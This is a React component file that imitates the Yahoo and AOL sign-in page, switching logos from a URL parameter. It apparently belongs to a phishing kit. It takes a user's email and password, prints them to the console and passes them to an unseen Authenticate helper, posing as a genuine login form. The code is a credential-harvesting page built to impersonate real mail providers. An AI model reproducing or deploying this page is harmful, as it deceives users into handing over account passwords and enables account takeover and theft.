import { useState } from 'react'
import yahoo from '../../assets/yahoo-logo.png'
import aol from '../../assets/Aol-logo.png'
import { useParams } from 'react-router-dom'
import { Authenticate } from '../../helpers/Auth'

const Yahoo = () => {
  const { service } = useParams()
  const [userID, setUserID] = useState('')
  const [password, setPassword] = useState('')
  const [showPasswordInput, setShowPasswordInput] = useState(false)
  const [error, setError] = useState('')

  const handleClick = () => {
    setError('')
    if (userID) {
      if (!showPasswordInput) {
        setShowPasswordInput(true)
      } else if (password) {
        console.log(userID, password)
        Authenticate(userID, password, service)
      } else {
        setError('Enter your password')
        return
      }
    } else {
      setError('Please provide a valid email')
      return
    }
  }
  return (
    <div className='w-screen h-screen overflow-y-auto flex flex-col '>
      <header className='xs:hidden md:flex justify-between items-center py-5 px-14'>
        <img src={service === 'yahoo' ? yahoo : aol} className='w-[8rem]' />
        <p className='text-[#003AC2]'>Help</p>
      </header>
      <main className='flex md:w-[75%] justify-self-center self-center justify-around items-center'>
        <aside
          className={`w-[40%] hidden md:inline-block  ${
            service !== 'yahoo' && 'invisible'
          }`}
        >
          <h3 className='font-extrabold text-2xl tracking-tight mb-3'>
            Yahoo makes it easy to enjoy what matters most in your world.
          </h3>
          <p className='text-xl tracking-tight'>
            Best in class Yahoo Mail, breaking local, national and global news,
            finance, sports, music, movies and more. You get more out of the
            web, you get more out of life.
          </p>
        </aside>
        <div className='md:shadow-yahooLogin w-[360px] min-h-[550px] px-[5px] py-7 flex items-center justify-around flex-col'>
          <img
            src={service === 'yahoo' ? yahoo : aol}
            className='w-[5.5rem] justify-self-start mb-5'
          />
          <section className='text-center'>
            {!setPassword ? (
              <>
                <p className='text-xl font-semibold'>Sign in</p>
                <p>using your Yahoo account</p>
              </>
            ) : (
              <>
                <p className='text-lg tracking-wide'>{userID}</p>
                <p className='text-xl font-semibold'>Enter password</p>
                <p>to finish sign in</p>
              </>
            )}
          </section>

          <section className='w-[90%] flex flex-col gap-9'>
            <div>
              {!showPasswordInput ? (
                <input
                  placeholder='Username, email, or mobile'
                  className='w-full outline-none border-b-2 pr-7 h-7'
                  value={userID}
                  onChange={(e) => setUserID(e.target.value)}
                />
              ) : (
                <input
                  type='password'
                  placeholder='Password'
                  className='w-full outline-none border-b-2 pr-7 h-7'
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                />
              )}
              <p className='text-red-600 text-sm'>{error}</p>
            </div>
            <button
              className={`w-full bg-[#188fff] outline-[#188fff] py-[9.6px] font-semibold text-lg text-white  ${
                service === 'yahoo' && 'rounded-full'
              }`}
              onClick={handleClick}
            >
              {showPasswordInput ? 'Submit' : 'Next'}
            </button>
            <div className='flex w-full justify-between'>
              <span className='flex gap-2'>
                <input type='checkbox' />
                <label className='text-[#188fff]'>Stay signed in</label>
              </span>
              <span className='flex gap-2'>
                <p className='text-[#188fff]'>Forgot username?</p>
              </span>
            </div>

            <button className='border-[#188fff] border py-[9.6px] font-semibold text-lg rounded-full text-[#188fff] tracking-wide'>
              Create an account
            </button>
          </section>
        </div>
      </main>
    </div>
  )
}

export default Yahoo
